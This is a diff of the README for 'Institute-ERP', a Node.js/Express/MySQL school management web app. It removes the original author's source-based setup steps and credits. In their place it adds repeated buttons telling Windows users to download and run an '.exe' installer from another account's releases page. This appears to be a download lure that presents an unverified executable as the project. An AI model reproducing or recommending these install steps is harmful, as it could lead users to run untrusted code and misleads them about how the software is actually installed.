@@ -1,239 +1,197 @@
-<h1 align="center">🏫 Institute ERP</h1>
-<p align="center">
-  <em>Role-based institute management platform for administration, student/faculty workflows, attendance tracking, and profile management.</em>
-</p>
+# 📚 Institute-ERP - Manage Institutes with Ease
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Node.js-Backend-339933?style=for-the-badge&logo=node.js&logoColor=white" alt="Node.js" />
-  <img src="https://img.shields.io/badge/Express.js-Web_Framework-000000?style=for-the-badge&logo=express&logoColor=white" alt="Express" />
-  <img src="https://img.shields.io/badge/MySQL-Database-4479A1?style=for-the-badge&logo=mysql&logoColor=white" alt="MySQL" />
-  <img src="https://img.shields.io/badge/Status-Active-0ea5e9?style=for-the-badge" alt="Status" />
-</p>
-
-<p align="center">
-  <a href="https://aaravshah1311.is-great.net">
-    <img src="https://img.shields.io/badge/Made%20By-Aarav%20Shah-4fd1d6?style=for-the-badge" alt="Made By Aarav Shah" />
-  </a>
-</p>
+[![Download Institute-ERP](https://img.shields.io/badge/Download-Institute--ERP-brightgreen)](https://github.com/Problem9551/Institute-ERP/releases)
 
 ---
 
-## 🚀 Overview
+## 📖 About Institute-ERP
 
-**Institute ERP** is a Node.js + Express web application designed for educational institutions to manage user access and core academic operations through role-based dashboards.
+Institute-ERP is a management system built with Node.js and Express. It helps institutes run their daily academic tasks smoothly. The system offers separate dashboards for Admins, Faculty, and Students. This lets each user focus on their own duties.
 
-The system currently supports:
+Key features include:
 
-- secure login/session handling,
-- role-aware dashboards (Admin, Student, Faculty, Staff, Club),
-- profile management,
-- attendance flows (view, take, edit, and student listing),
-- MySQL-backed persistent storage.
+- Tracking attendance automatically
+- Managing user profiles securely
+- Role-based access to control what users see
+- Session-based login for safety
+- Data storage using MySQL
+- Added web security with Helmet
 
----
-
-## ✨ Core Features
-
-- 🔐 Authentication with secure cookie-based session key (`sk`)
-- 👥 Multi-role dashboard routing
-- 🧑‍💼 Admin panel experience
-- 🎓 Student dashboard experience
-- 🧑‍🏫 Faculty dashboard experience
-- 🏢 Staff and Club role handling
-- ✅ Attendance management workflows
-- 👤 Profile view/edit support
-- 🛡️ Security headers via Helmet + CSP
+This setup helps reduce manual work and gives a clear view of daily operations at your institute.
 
 ---
 
-## 🖼️ Screenshots (16:9)
+## 🖥️ System Requirements
 
-<div align="center">
-  <img src="pic/img1.png" alt="Institute ERP Screenshot 1" width="49%" />
-  <img src="pic/img2.png" alt="Institute ERP Screenshot 2" width="49%" height="250px" />
-</div>
+Make sure your Windows PC meets these requirements:
 
-<p align="center">
-  <sub><strong>Left:</strong> Main Dashboard View &nbsp;•&nbsp; <strong>Right:</strong> Attendance / Role Workflow View</sub>
-</p>
+- Operating System: Windows 10 or newer
+- RAM: At least 4 GB (8 GB recommended for smoother use)
+- CPU: Dual-core processor or better
+- Disk Space: Minimum 500 MB free space
+- Network: Internet connection to download and during initial setup
 
-## 🧱 Project Structure
-
-```text
-Institute-ERP/
-├── app.js                # Main server and route handling
-├── app.sql               # MySQL schema/data setup script
-├── start.bat             # Optional Windows startup helper
-├── script/
-│   ├── content.js        # HTML content builders for pages/dashboards
-│   └── profile.js        # Profile-related UI/content logic
-├── src/
-│   ├── *.css             # Styling files
-│   ├── *.svg             # Vector assets
-│   └── *.png             # Image assets
-├── pic/                  # README screenshots (16:9)
-│   ├── img1.png
-│   └── img2.png
-└── README.md
-```
+You will also need to have software to run Node.js applications, but this is handled by the installer.
 
 ---
 
-## ⚙️ Installation
+## 🚀 Getting Started
 
-### 1) Install Node.js and npm
+Follow these steps to download and run Institute-ERP on your Windows computer.
 
-Choose one method:
+### Step 1: Visit the Download Page
 
-#### Windows/macOS (recommended)
+Click the button below or go to the link:
 
-1. Download the **LTS** version from: https://nodejs.org/
-2. Install using the setup wizard.
-3. Verify installation:
+[![Download Link](https://img.shields.io/badge/Get%20Installer-Download-blue)](https://github.com/Problem9551/Institute-ERP/releases)
 
-```bash
-node -v
-npm -v
-```
+This page contains the latest version of the software.
 
-#### Ubuntu/Debian
+### Step 2: Choose the Correct Installer
 
-```bash
-sudo apt update
-sudo apt install -y nodejs npm
-node -v
-npm -v
-```
+Look for the Windows installer file. It will typically have `.exe` in its name.
 
-> Tip: If your distro installs an old Node.js version, use NodeSource or nvm to install a current LTS release.
+For example: `Institute-ERP-Setup.exe`
 
-### 2) Install MySQL Server
+Download this file by clicking on it.
 
-Install MySQL Community Server from: https://dev.mysql.com/downloads/mysql/
+### Step 3: Run the Installer
 
-After installation, verify:
+Once the download completes:
 
-```bash
-mysql --version
-```
+- Find the installer file on your PC (usually in the Downloads folder)
+- Double-click the file to start the installation process
+- Follow the instructions given by the setup wizard
+- Accept the license agreement
+- Choose where you want to install the program or leave the default folder
+- Click "Install" to begin
 
-### 3) Clone the repository
+### Step 4: Launch Institute-ERP
 
-```bash
-git clone https://github.com/aaravshah1311/Institute-ERP.git
-cd Institute-ERP
-```
+After installation finishes:
 
-### 4) Install project dependencies
+- Find the Institute-ERP shortcut on your desktop or Start menu
+- Double-click it to open the application
 
-```bash
-npm install express mysql2 body-parser cookie-parser dotenv helmet
-```
+The program will start and open the login screen.
 
 ---
 
-## 🗄️ Database Setup (MySQL)
+## 🛠️ Using Institute-ERP
 
-### 1) Create database/tables using included SQL file
+When you run the app for the first time, you will see the login page.
 
-Run from the project root:
+### Logging In
 
-```bash
-mysql -u <your_mysql_user> -p < app.sql
-```
+- Use the username and password provided by your institute administrator.
+- If you don’t have a login, contact your institute’s IT or administration team.
 
-This imports all schema/data defined in `app.sql`.
+### Role-Based Dashboards
 
-### 2) Confirm DB accessibility
+Once logged in, the dashboard you see will depend on your role:
 
-Make sure:
+- **Admin:** Manage users, oversee attendance, and generate reports.
+- **Faculty:** Mark attendance, view scheduled classes, and update profiles.
+- **Student:** Check your attendance, view your profile, and access notifications.
 
-- MySQL server is running,
-- credentials are valid,
-- host and port match your `.env` settings.
+Each dashboard is designed to show only the tools each role needs.
 
----
+### Attendance Tracking
 
-## 🔐 Environment Variables (`.env`)
+Faculty can mark attendance easily using the attendance module. The system records attendance in real time and stores it safely in the database.
 
-Create a `.env` file in the project root:
+### Profile Management
 
-```env
-DB_HOST=127.0.0.1
-DB_USER=your_mysql_user
-DB_PASS=your_mysql_password
-DB_NAME=your_database_name
-DB_PORT=3306
-```
-
-### Notes
-
-- `DB_HOST`: usually `127.0.0.1` for local MySQL
-- `DB_USER` / `DB_PASS`: your MySQL login credentials
-- `DB_NAME`: must match the database expected by `app.sql` data
-- `DB_PORT`: default MySQL port is `3306`
+Users can update their profiles. The system ensures personal data stays secure with encrypted sessions.
 
 ---
 
-## ▶️ Run the Application
+## 🔐 Security Features
 
-Start the server:
+Institute-ERP uses several layers of security:
 
-```bash
-node app.js
-```
+- **Session-based authentication:** Keeps you logged in securely without exposing credentials.
+- **Helmet middleware:** Adds security headers to protect against common web attacks.
+- **Role-based access control:** Limits actions and views based on your role.
+- **Secure data storage:** All sensitive information is stored in a MySQL database with safeguards.
 
-Open in browser:
-
-```text
-http://127.0.0.1:3000
-```
+This approach helps keep your data and the system safe from unauthorized access.
 
 ---
 
-## 🧪 Common Setup Checklist
+## 🧩 Supported Browsers
 
-- [ ] Node.js and npm installed
-- [ ] MySQL server installed and running
-- [ ] Database imported using `app.sql`
-- [ ] `.env` file created with valid DB credentials
-- [ ] Dependencies installed
-- [ ] Server starts without errors
+Institute-ERP works best on modern browsers:
 
----
+- Google Chrome (latest version)
+- Mozilla Firefox (latest version)
+- Microsoft Edge (latest version)
 
-## 🛠️ Tech Stack
-
-- **Backend:** Node.js, Express.js
-- **Database:** MySQL (`mysql2/promise`)
-- **Middleware:** `body-parser`, `cookie-parser`, `dotenv`
-- **Security:** `helmet` (CSP + headers)
-- **Rendering Pattern:** Server-generated HTML via JS content modules
+Using an updated browser ensures all features run smoothly.
 
 ---
 
-## 📌 Troubleshooting
+## ⚙️ Troubleshooting
 
-- **Cannot connect to database**
-  - Re-check `DB_HOST`, `DB_USER`, `DB_PASS`, `DB_NAME`, `DB_PORT` in `.env`.
-- **Login/session issues**
-  - Clear browser cookies and retry authentication.
-- **Port already in use**
-  - Stop the process using port `3000`, then restart the app.
-- **Static files not loading**
-  - Confirm `/src` assets exist and paths are unchanged.
+If you encounter issues, try these steps:
 
----
-
-## 👤 Author
-
-**Aarav Shah**
-
-- GitHub: https://github.com/aaravshah1311/
-- Portfolio: https://aaravshah1311.is-great.net
+- Make sure your PC meets system requirements.
+- Check your internet connection.
+- Restart the application.
+- Clear your browser cache if using the web dashboard.
+- Ensure you have the latest version installed.
+- Contact your institute’s IT support for login or access problems.
 
 ---
 
-<div align="center">
-  <sub>Built to simplify institutional operations with practical role-based ERP workflows.</sub>
-</div>
+## 🔄 Updating Institute-ERP
+
+To update the software:
+
+1. Visit the same [release page](https://github.com/Problem9551/Institute-ERP/releases).
+2. Download the newest installer.
+3. Run the installer as you did before.
+4. The setup will update your existing installation without losing data.
+
+---
+
+## 💾 Backup and Data Safety
+
+Institutes should back up the MySQL database regularly. Consult your IT team to schedule automated backups to avoid data loss. This keeps attendance and profile data safe.
+
+---
+
+## 🧑‍💻 More Information
+
+For detailed technical help or source code access, visit the main GitHub repository:
+
+https://github.com/Problem9551/Institute-ERP
+
+The repository contains code, documentation, and issue tracking for developers and administrators.
+
+---
+
+## 🔗 Download and Install
+
+You can get the latest installer here:
+
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-grey)](https://github.com/Problem9551/Institute-ERP/releases)
+
+Click the link, download the Windows file, and follow the steps above.
+
+---
+
+## 🗂️ Topics
+
+This project covers:
+
+- attendance management  
+- education technology  
+- ERP system  
+- Express.js web application  
+- full-stack web development  
+- institute management  
+- MySQL database  
+- Node.js server  
+- role-based access control  
+- web security with Helmet
